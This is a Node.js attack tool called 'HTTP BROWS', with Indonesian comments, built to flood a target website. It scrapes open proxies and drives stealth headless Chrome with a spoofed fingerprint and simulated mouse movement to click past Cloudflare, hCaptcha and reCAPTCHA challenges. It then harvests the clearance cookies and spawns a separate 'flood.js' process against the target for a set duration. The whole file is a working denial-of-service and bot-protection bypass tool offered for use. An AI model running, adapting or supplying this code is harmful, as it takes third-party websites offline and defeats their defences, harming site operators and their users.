const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const {exec} = require('child_process');
const {spawn} = require("child_process");
const chalk = require('chalk');
const axios = require('axios');
const errorHandler = error => console.log(error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function(item) {
    const index = this.indexOf(item);
    if (index !== -1) this.splice(index, 1);
    return item
};

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

const validkey = generateRandomString(5, 10);

// AUTO PROXY FINDER - Dapatkan proxy otomatis dari berbagai sumber
async function fetchProxiesFromSources() {
    colored(colors.COLOR_BRIGHT_CYAN, `[PROXY] Mencari proxy dari berbagai sumber...`);
    
    const proxySources = [
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://www.proxy-list.download/api/v1/get?type=http'
    ];

    let allProxies = [];
    
    for (const source of proxySources) {
        try {
            colored(colors.COLOR_BRIGHT_YELLOW, `[PROXY] Mengambil dari: ${source}`);
            const response = await axios.get(source, { timeout: 10000 });
            const proxies = response.data.split('\n')
                .map(p => p.trim())
                .filter(p => p && /^[\d\.]+:\d+$/.test(p));
            
            allProxies = [...allProxies, ...proxies];
            colored(colors.COLOR_BRIGHT_GREEN, `[PROXY] Dapat ${proxies.length} proxy dari ${source}`);
            
            // Jangan terlalu cepat
            await humanDelay(1, 3);
        } catch (error) {
            colored(colors.COLOR_RED, `[PROXY ERROR] Gagal dari ${source}: ${error.message}`);
        }
    }

    // Remove duplicates
    allProxies = [...new Set(allProxies)];
    colored(colors.COLOR_BRIGHT_GREEN, `[PROXY] Total ${allProxies.length} proxy unik ditemukan`);
    
    return allProxies;
}

// PROXY VALIDATOR - Test proxy sebelum digunakan
async function validateProxy(proxy) {
    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 10000);
        
        const response = await axios.get('http://httpbin.org/ip', {
            proxy: {
                host: proxy.split(':')[0],
                port: parseInt(proxy.split(':')[1])
            },
            timeout: 10000,
            signal: controller.signal
        });
        
        clearTimeout(timeout);
        return response.status === 200;
    } catch (error) {
        return false;
    }
}

// Enhanced human delay simulation dengan rate limiting
function humanDelay(minSeconds, maxSeconds) {
    const delay = (Math.random() * (maxSeconds - minSeconds) + minSeconds) * 1000;
    return new Promise(resolve => setTimeout(resolve, delay));
}

// RATE LIMITER - Jangan terlalu cepat launch browser
class RateLimiter {
    constructor(maxConcurrent, minDelay = 3000, maxDelay = 8000) {
        this.maxConcurrent = maxConcurrent;
        this.minDelay = minDelay;
        this.maxDelay = maxDelay;
        this.active = 0;
        this.queue = [];
    }

    async acquire() {
        return new Promise((resolve) => {
            this.queue.push(resolve);
            this.process();
        });
    }

    release() {
        this.active--;
        this.process();
    }

    process() {
        if (this.active < this.maxConcurrent && this.queue.length > 0) {
            this.active++;
            const resolve = this.queue.shift();
            
            // Random delay antara requests
            const delay = Math.random() * (this.maxDelay - this.minDelay) + this.minDelay;
            setTimeout(() => {
                resolve();
            }, delay);
        }
    }
}

// Buat rate limiter instance
const browserLimiter = new RateLimiter(3, 5000, 15000); // Max 3 concurrent, delay 5-15 detik

async function simulateHumanMouseMovement(page, element, options = {}) {
    const { minMoves = 8, maxMoves = 15, minDelay = 80, maxDelay = 200, jitterFactor = 0.15, overshootChance = 0.3, hesitationChance = 0.2, finalDelay = 800 } = options;
    
    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');
    
    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;
    const pageDimensions = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
    
    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;
    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;

    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;
        
        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
        
        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.8 + 0.2) * (nextX - currentX);
            nextY += (Math.random() * 0.8 + 0.2) * (nextY - currentY);
        }
        
        await page.mouse.move(nextX, nextY, { steps: 15 + Math.floor(Math.random() * 10) });
        
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await humanDelay(delay/1000, delay/1000 * 1.5);
        
        if (Math.random() < hesitationChance) {
            await humanDelay(0.3, 1.2);
        }
        
        currentX = nextX;
        currentY = nextY;
    }
    
    await page.mouse.move(targetX, targetY, { steps: 8 });
    await humanDelay(finalDelay/1000, finalDelay/1000 * 1.3);
}

// ULTIMATE CAPTCHA DETECTION
async function detectAllCaptchaTypes(page) {
    const detectionResults = {
        hasCloudflare: false,
        hasHcaptcha: false,
        hasRecaptcha: false,
        hasTurnstile: false,
        challengeType: 'unknown',
        elements: []
    };

    const cloudflareSelectors = [
        '#challenge-form', '.challenge-form', '.cf-challenge', '[data-translate="challenge_page"]',
        'iframe[src*="challenges.cloudflare.com"]', 'div#cf-challenge-running',
        '.cf-browser-verification', '.cf-captcha-container', 'input[name="cf_captcha_kind"]'
    ];

    const hcaptchaSelectors = [
        '.h-captcha', '[data-sitekey]', 'iframe[src*="hcaptcha.com"]', '.hcaptcha-box'
    ];

    const recaptchaSelectors = [
        '.g-recaptcha', '[data-sitekey]', 'iframe[src*="google.com/recaptcha"]', '.recaptcha-checkbox'
    ];

    const turnstileSelectors = [
        '.cf-turnstile', '[data-sitekey]', 'iframe[src*="challenges.cloudflare.com/turnstile"]'
    ];

    // Check semua selectors
    const allSelectors = [...cloudflareSelectors, ...hcaptchaSelectors, ...recaptchaSelectors, ...turnstileSelectors];
    for (const selector of allSelectors) {
        try {
            const element = await page.$(selector);
            if (element) {
                if (cloudflareSelectors.includes(selector)) detectionResults.hasCloudflare = true;
                if (hcaptchaSelectors.includes(selector)) detectionResults.hasHcaptcha = true;
                if (recaptchaSelectors.includes(selector)) detectionResults.hasRecaptcha = true;
                if (turnstileSelectors.includes(selector)) detectionResults.hasTurnstile = true;
                detectionResults.elements.push({ type: getCaptchaType(selector), selector, element });
            }
        } catch (e) {}
    }

    // Advanced content analysis
    const content = await page.content();
    const title = await page.title().catch(() => '');
    const url = page.url();

    if (content.includes('cf_chl_rc_m') || content.includes('cf-chl-w') || content.includes('cf_clearance') || 
        content.includes('challenges.cloudflare.com') || title === "Just a moment..." || 
        title.includes("Attention Required") || url.includes('challenges.cloudflare.com')) {
        detectionResults.hasCloudflare = true;
        detectionResults.challengeType = 'cloudflare_challenge';
    }

    if (content.includes('hcaptcha') || content.includes('h.sw') || content.includes('hcaptcha.com')) {
        detectionResults.hasHcaptcha = true;
        detectionResults.challengeType = 'hcaptcha';
    }

    if (content.includes('recaptcha') || content.includes('grecaptcha') || content.includes('google.com/recaptcha')) {
        detectionResults.hasRecaptcha = true;
        detectionResults.challengeType = 'recaptcha';
    }

    if (!detectionResults.challengeType || detectionResults.challengeType === 'unknown') {
        if (detectionResults.hasCloudflare) detectionResults.challengeType = 'cloudflare_challenge';
        else if (detectionResults.hasHcaptcha) detectionResults.challengeType = 'hcaptcha';
        else if (detectionResults.hasRecaptcha) detectionResults.challengeType = 'recaptcha';
        else if (detectionResults.hasTurnstile) detectionResults.challengeType = 'turnstile';
    }

    return detectionResults;
}

function getCaptchaType(selector) {
    if (selector.includes('cf-') || selector.includes('challenge')) return 'cloudflare';
    if (selector.includes('hcaptcha') || selector.includes('h-')) return 'hcaptcha';
    if (selector.includes('recaptcha') || selector.includes('g-')) return 'recaptcha';
    if (selector.includes('turnstile')) return 'turnstile';
    return 'unknown';
}

// ULTIMATE CAPTCHA SOLVING
async function solvingCaptcha(page, browserProxy) {
    let attempts = 0;
    const maxAttempts = 5;
    
    while (attempts < maxAttempts) {
        try {
            colored(colors.COLOR_BRIGHT_YELLOW, `[CAPTCHA] Attempt ${attempts + 1}/${maxAttempts} with proxy: ${browserProxy}`);
            
            await humanDelay(3, 8);

            const captchaDetection = await detectAllCaptchaTypes(page);
            colored(colors.COLOR_BRIGHT_CYAN, `[DETECTION] Type: ${captchaDetection.challengeType} | Cloudflare: ${captchaDetection.hasCloudflare} | hCaptcha: ${captchaDetection.hasHcaptcha} | reCAPTCHA: ${captchaDetection.hasRecaptcha}`);

            const title = await page.title();
            if (title === "Attention Required! | Cloudflare") {
                colored(colors.COLOR_RED, `[BLOCKED] Cloudflare block detected`);
                return false;
            }

            if (!captchaDetection.hasCloudflare && !captchaDetection.hasHcaptcha && !captchaDetection.hasRecaptcha && !captchaDetection.hasTurnstile) {
                colored(colors.COLOR_GREEN, `[SUCCESS] No captcha detected`);
                return true;
            }

            colored(colors.COLOR_BRIGHT_YELLOW, `[CAPTCHA] ${captchaDetection.challengeType} detected, solving...`);

            // CLOUDFLARE SOLVER
            if (captchaDetection.hasCloudflare) {
                colored(colors.COLOR_BRIGHT_YELLOW, `[STRATEGY] Using Cloudflare challenge solver...`);
                const cloudflareSelectors = [
                    "body > div.main-wrapper > div > div > div > div",
                    "#challenge-form input[type='checkbox']", ".challenge-form input[type='checkbox']",
                    ".cf-challenge", "input[type='checkbox']", ".mark", ".checkbox"
                ];

                for (const selector of cloudflareSelectors) {
                    const element = await page.$(selector);
                    if (element) {
                        colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] Found element: ${selector}`);
                        await simulateHumanMouseMovement(page, element, {
                            minMoves: 10, maxMoves: 20, minDelay: 100, maxDelay: 250,
                            finalDelay: 1200, jitterFactor: 0.2, overshootChance: 0.4, hesitationChance: 0.3
                        });
                        await humanDelay(0.5, 1.5);
                        await element.click();
                        colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] Clicked challenge element`);
                        break;
                    }
                }
            }

            // hCaptcha SOLVER
            if (captchaDetection.hasHcaptcha) {
                colored(colors.COLOR_BRIGHT_YELLOW, `[STRATEGY] Using hCaptcha solver...`);
                const hcaptchaFrame = await page.$('iframe[src*="hcaptcha.com"]');
                if (hcaptchaFrame) {
                    const frame = await hcaptchaFrame.contentFrame();
                    const checkbox = await frame.$('.checkbox');
                    if (checkbox) {
                        await simulateHumanMouseMovement(page, checkbox);
                        await humanDelay(0.5, 1.5);
                        await checkbox.click();
                        colored(colors.COLOR_BRIGHT_YELLOW, `[HCAPTCHA] Clicked hCaptcha checkbox`);
                    }
                }
            }

            // reCAPTCHA SOLVER
            if (captchaDetection.hasRecaptcha) {
                colored(colors.COLOR_BRIGHT_YELLOW, `[STRATEGY] Using reCAPTCHA solver...`);
                const recaptchaFrame = await page.$('iframe[src*="google.com/recaptcha"]');
                if (recaptchaFrame) {
                    const frame = await recaptchaFrame.contentFrame();
                    const checkbox = await frame.$('.recaptcha-checkbox');
                    if (checkbox) {
                        await simulateHumanMouseMovement(page, checkbox);
                        await humanDelay(0.5, 1.5);
                        await checkbox.click();
                        colored(colors.COLOR_BRIGHT_YELLOW, `[RECAPTCHA] Clicked reCAPTCHA checkbox`);
                    }
                }
            }

            // GENERIC SOLVER
            const genericSelectors = [
                "input[type='submit']", "button[type='submit']", ".btn", ".button",
                "[role='button']", "input[value*='Verify']", "input[value*='Submit']"
            ];

            for (const selector of genericSelectors) {
                try {
                    const element = await page.$(selector);
                    if (element) {
                        await simulateHumanMouseMovement(page, element);
                        await humanDelay(0.3, 1.0);
                        await element.click();
                        colored(colors.COLOR_BRIGHT_YELLOW, `[GENERIC] Clicked: ${selector}`);
                        break;
                    }
                } catch (e) {}
            }

            // Wait for verification
            colored(colors.COLOR_BRIGHT_YELLOW, `[WAITING] Waiting for challenge verification...`);
            await humanDelay(8, 15);

            // Check jika berhasil
            const cookies = await page.cookies();
            const hasChallengeCookies = cookies.some(cookie => 
                cookie.name.includes('cf_clearance') || cookie.name.includes('cf_chl') || cookie.name === 'cf_chl_rc_m'
            );

            if (hasChallengeCookies) {
                colored(colors.COLOR_BRIGHT_GREEN, `[COOKIES] Challenge cookies detected: ${cookies.filter(c => c.name.includes('cf_')).map(c => c.name).join(', ')}`);
            }

            const currentUrl = page.url();
            if (!currentUrl.includes('challenge') && !currentUrl.includes('captcha')) {
                const finalTitle = await page.title();
                const finalCookies = await page.cookies();
                const cookieString = finalCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
                colored(colors.COLOR_BRIGHT_GREEN, `[SUCCESS] ${captchaDetection.challengeType} SOLVED | Title: ${finalTitle} | Cookies: ${cookieString} | Proxy: ${browserProxy}`);
                return true;
            }

            // Try navigation
            try {
                await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 });
                colored(colors.COLOR_GREEN, `[SUCCESS] Navigation completed after challenge`);
                return true;
            } catch (navError) {
                colored(colors.COLOR_YELLOW, `[INFO] No navigation, checking status...`);
            }

            const newTitle = await page.title();
            if (!newTitle.includes('Just a moment') && !newTitle.includes('Attention Required')) {
                colored(colors.COLOR_GREEN, `[SUCCESS] Challenge passed - Title changed to: ${newTitle}`);
                return true;
            }

            attempts++;
            if (attempts < maxAttempts) {
                colored(colors.COLOR_YELLOW, `[RETRY] Waiting before retry attempt ${attempts + 1}...`);
                await humanDelay(10, 20);
                
                if (attempts % 2 === 0) {
                    colored(colors.COLOR_YELLOW, `[REFRESH] Refreshing page for new challenge...`);
                    await page.reload();
                    await humanDelay(3, 7);
                }
            }

        } catch (error) {
            colored(colors.COLOR_RED, `[CAPTCHA ERROR] Attempt ${attempts + 1}: ${error.message}`);
            attempts++;
            if (attempts < maxAttempts) await humanDelay(5, 10);
        }
    }
    
    colored(colors.COLOR_RED, `[FAILED] Could not solve after ${maxAttempts} attempts`);
    return false;
}

const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`
];

const colors = {
    COLOR_RED: "\x1b[31m", COLOR_GREEN: "\x1b[32m", COLOR_YELLOW: "\x1b[33m", COLOR_RESET: "\x1b[0m",
    COLOR_PURPLE: "\x1b[35m", COLOR_CYAN: "\x1b[36m", COLOR_BLUE: "\x1b[34m", COLOR_BRIGHT_RED: "\x1b[91m",
    COLOR_BRIGHT_GREEN: "\x1b[92m", COLOR_BRIGHT_YELLOW: "\x1b[93m", COLOR_BRIGHT_BLUE: "\x1b[94m",
    COLOR_BRIGHT_PURPLE: "\x1b[95m", COLOR_BRIGHT_CYAN: "\x1b[96m", COLOR_BRIGHT_WHITE: "\x1b[97m",
    BOLD: "\x1b[1m", ITALIC: "\x1b[3m"
};

function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
}

async function spoofFingerprint(page) {
    const userAgent = randomElement(userAgents);
    await page.evaluateOnNewDocument((ua) => {
        Object.defineProperty(navigator, 'userAgent', { value: ua });
        Object.defineProperty(navigator, 'platform', { value: 'Win32' });
        Object.defineProperty(navigator, 'vendor', { value: 'Google Inc.' });
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'language', { value: 'en-US' });
        Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 0 });
        Object.defineProperty(screen, 'width', { value: 1920 });
        Object.defineProperty(screen, 'height', { value: 1080 });
        Object.defineProperty(screen, 'availWidth', { value: 1920 });
        Object.defineProperty(screen, 'availHeight', { value: 1040 });
        Object.defineProperty(screen, 'colorDepth', { value: 24 });
        Object.defineProperty(screen, 'pixelDepth', { value: 24 });
        Object.defineProperty(navigator, 'plugins', {
            value: [
                { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                { name: 'Native Client', filename: 'internal-nacl-plugin' }
            ],
            configurable: false
        });
    }, userAgent);
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

if (process.argv.length < 8) {
    console.clear();
    console.log(`
    ${chalk.redBright('HTTP BROWS')} | Updated: Oktober 01, 2025
    
    ${chalk.blueBright('Usage:')}
        ${chalk.redBright(`node ${process.argv[1]} <target> <duration> <threads browser> <threads flood> <rates> <proxy>`)}
    `);
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];

if (!/^https?:\/\//i.test(targetURL)) {
    console.error('URL must start with http:// or https://');
    process.exit(1);
}

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/).filter(proxy => {
            const regex = /^[\w\.-]+:\d+$/;
            return regex.test(proxy);
        });
        return proxies;
    } catch (error) {
        console.error('Error file proxy:', error);
        return [];
    }
};

// Enhanced browser launch dengan rate limiting
async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 3) {
    // Tunggu rate limiter sebelum memulai
    await browserLimiter.acquire();
    
    try {
        const userAgent = randomElement(userAgents);
        const options = {
            headless: true,
            args: [
                `--proxy-server=${browserProxy}`, `--user-agent=${userAgent}`, '--headless=new',
                '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote',
                '--window-size=1920,1080', '--disable-gpu', '--disable-accelerated-2d-canvas',
                '--disable-background-timer-throttling', '--disable-backgrounding-occluded-windows',
                '--disable-back-forward-cache', '--disable-browser-side-navigation', '--disable-renderer-backgrounding',
                '--disable-ipc-flooding-protection', '--metrics-recording-only', '--disable-extensions',
                '--disable-default-apps', '--disable-application-cache', '--disable-client-side-phishing-detection',
                '--disable-popup-blocking', '--disable-prompt-on-repost', '--disable-infobars',
                '--ignore-certificate-errors', '--ignore-ssl-errors', '--disable-blink-features=AutomationControlled',
                '--no-first-run', '--disable-web-security', '--allow-running-insecure-content'
            ],
            defaultViewport: { width: 1920, height: 1080, deviceScaleFactor: 1, isMobile: false, hasTouch: false, isLandscape: true }
        };

        let browser;
        try {
            browser = await puppeteer.launch(options);
            const [page] = await browser.pages();
            
            await spoofFingerprint(page);
            page.setDefaultNavigationTimeout(120000);
            page.setDefaultTimeout(60000);

            colored(colors.COLOR_BRIGHT_CYAN, `[BROWSER] Launching with proxy: ${browserProxy} (Attempt ${attempt})`);
            
            await humanDelay(2, 5);
            await page.goto(targetURL, { waitUntil: "networkidle2", timeout: 60000 });
            
            colored(colors.COLOR_BRIGHT_CYAN, `[BROWSER] Page loaded, detecting challenges...`);
            await humanDelay(3, 7);
            
            const captchaSuccess = await solvingCaptcha(page, browserProxy);
            if (!captchaSuccess) throw new Error('Challenge solving failed');
            
            await humanDelay(2, 4);
            const finalTitle = await page.title();
            const cookies = await page.cookies();
            const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
            
            const challengeCookies = cookies.filter(cookie => 
                cookie.name.includes('cf_') || cookie.name.includes('captcha') || cookie.name.includes('challenge')
            );
            
            if (challengeCookies.length > 0) {
                colored(colors.COLOR_BRIGHT_GREEN, `[CHALLENGE COOKIES] ${challengeCookies.map(c => c.name).join(', ')}`);
            }
            
            await browser.close();
            browserLimiter.release();
            
            colored(colors.COLOR_BRIGHT_GREEN, `[SUCCESS] Challenge bypassed | Title: ${finalTitle} | Cookies: ${cookieString.substring(0, 100)}... | Proxy: ${browserProxy}`);
            
            return {
                title: finalTitle, browserProxy: browserProxy, cookies: cookieString,
                userAgent: userAgent, challengeCookies: challengeCookies.map(c => c.name)
            };
            
        } catch (error) {
            if (browser) {
                await browser.close().catch(() => {});
            }
            browserLimiter.release();
            
            colored(colors.COLOR_RED, `[BROWSER ERROR] Attempt ${attempt}: ${error.message}`);
            
            if (attempt < maxRetries) {
                const retryDelay = Math.pow(2, attempt) * 1000 + Math.random() * 5000;
                colored(colors.COLOR_YELLOW, `[RETRY] Waiting ${Math.round(retryDelay/1000)}s before retry...`);
                await new Promise(resolve => setTimeout(resolve, retryDelay));
                return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
            } else {
                throw new Error(`Failed after ${maxRetries} retries: ${error.message}`);
            }
        }
    } catch (error) {
        browserLimiter.release();
        throw error;
    }
}

let cookieCount = 0;
let successCount = 0;
let activeThreads = 0;

async function startthread(targetURL, browserProxy, task, done, retries = 0) {
    const maxRetries = 2;
    
    if (retries >= maxRetries) {
        colored(colors.COLOR_RED, `[FINAL FAIL] Proxy exhausted: ${browserProxy}`);
        done(null, { task, status: 'failed' });
        return;
    }

    try {
        activeThreads++;
        colored(colors.COLOR_BRIGHT_CYAN, `[THREAD] Starting with proxy: ${browserProxy} (Active: ${activeThreads}/${threads})`);
        
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        
        if (response && response.cookies) {
            cookieCount++;
            successCount++;
            
            colored(colors.COLOR_BRIGHT_GREEN, `[SUCCESS] Total: ${cookieCount} | Success: ${successCount}/${cookieCount} | Title: ${response.title} | Proxy: ${browserProxy}`);
            colored(colors.COLOR_BRIGHT_WHITE, `[COOKIES] ${response.cookies.substring(0, 150)}...`);

            if (response.challengeCookies && response.challengeCookies.length > 0) {
                colored(colors.COLOR_BRIGHT_PURPLE, `[CHALLENGE] Solved: ${response.challengeCookies.join(', ')}`);
            }
            
            // Spawn flood process
            try {
                spawn("node", [
                    "flood.js", targetURL, duration.toString(), thread.toString(),
                    response.browserProxy, rates, response.cookies, response.userAgent
                ], { stdio: 'inherit' });
                
                colored(colors.COLOR_BRIGHT_PURPLE, `[FLOOD] Spawned flood process`);
            } catch (error) {
                colored(colors.COLOR_RED, `[FLOOD ERROR] ${error.message}`);
            }
            
            activeThreads--;
            done(null, { task, status: 'success' });
        } else {
            throw new Error('No valid response from browser');
        }
        
    } catch (error) {
        activeThreads--;
        colored(colors.COLOR_RED, `[THREAD ERROR] ${browserProxy}: ${error.message}`);
        await humanDelay(5, 10);
        startthread(targetURL, browserProxy, task, done, retries + 1);
    }
}

const queue = async.queue(function(task, done) {
    startthread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(function() {
    colored(colors.COLOR_BRIGHT_GREEN, `[COMPLETE] All proxies processed | Success: ${successCount}/${proxies.length}`);
    process.exit(0);
});

queue.error(function(err, task) {
    colored(colors.COLOR_RED, `[QUEUE ERROR] ${err.message}`);
});

async function main() {
    let proxies = [];
    
    // Coba baca dari file dulu
    try {
        proxies = readProxiesFromFile(proxyFile);
        colored(colors.COLOR_BRIGHT_GREEN, `[PROXY] Loaded ${proxies.length} proxies from file`);
    } catch (error) {
        colored(colors.COLOR_YELLOW, `[PROXY] No proxies from file, fetching from online sources...`);
    }
    
    // Jika file kosong, ambil dari online
    if (proxies.length === 0) {
        proxies = await fetchProxiesFromSources();
        
        // Save proxies to file untuk penggunaan berikutnya
        if (proxies.length > 0) {
            fs.writeFileSync(proxyFile, proxies.join('\n'));
            colored(colors.COLOR_BRIGHT_GREEN, `[PROXY] Saved ${proxies.length} proxies to ${proxyFile}`);
        }
    }
    
    if (proxies.length === 0) {
        colored(colors.COLOR_RED, "[ERROR] No valid proxies found");
        process.exit(1);
    }
    
    colored(colors.COLOR_BRIGHT_GREEN, `[START] Processing ${proxies.length} proxies with ${threads} threads`);
    
    const shuffledProxies = [...proxies].sort(() => Math.random() - 0.5);
    
    for (let i = 0; i < shuffledProxies.length; i++) {
        const browserProxy = shuffledProxies[i];
        queue.push({ browserProxy: browserProxy, index: i + 1 });
        await humanDelay(0.5, 2); // Delay antara queue push
    }

    setTimeout(() => {
        colored(colors.COLOR_BRIGHT_YELLOW, `[TIMEOUT] Duration reached (${duration}s), cleaning up...`);
        queue.kill();
        
        exec('pkill -f "node.*flood"', (err) => {
            if (!err) colored(colors.COLOR_GREEN, "[CLEANUP] Flood processes terminated");
        });
        
        exec('pkill -f chrome', (err) => {
            if (!err) colored(colors.COLOR_GREEN, "[CLEANUP] Chrome processes terminated");
        });
        
        setTimeout(() => {
            colored(colors.COLOR_BRIGHT_GREEN, `[FINAL] Completed | Success Rate: ${successCount}/${proxies.length}`);
            process.exit(0);
        }, 5000);
        
    }, duration * 1000);
}

console.clear();
colored(colors.COLOR_BRIGHT_GREEN, "[SYSTEM] HTTP BROWS - Ultimate Auto-Proxy Captcha Solver");
colored(colors.COLOR_BRIGHT_CYAN, `[CONFIG] Target: ${targetURL}`);
colored(colors.COLOR_BRIGHT_CYAN, `[CONFIG] Duration: ${duration}s | Browser Threads: ${threads} | Flood Threads: ${thread}`);
colored(colors.COLOR_BRIGHT_CYAN, `[CONFIG] Rates: ${rates} | Proxy File: ${proxyFile}`);
colored(colors.COLOR_BRIGHT_YELLOW, "[SYSTEM] Starting ultimate captcha solver with auto-proxy...");

main().catch(err => {
    colored(colors.COLOR_RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
